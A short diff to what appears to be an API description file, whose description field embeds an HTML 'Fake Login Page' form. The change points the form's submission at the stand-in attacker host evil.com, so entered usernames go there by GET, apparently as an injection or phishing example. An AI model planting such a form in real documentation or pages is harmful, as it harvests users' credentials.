@@ -4,7 +4,7 @@ info:
   title: Fake Login Page
   description: |
     <div class="form-container">
-      <form action="http://www.happy.com" method="get" class="form-signin">
+      <form action="http://www.evil.com" method="get" class="form-signin">
         <div class="form-group">
           <label for="username">Username</label>
           <input type="text" name="username" size="20" required>
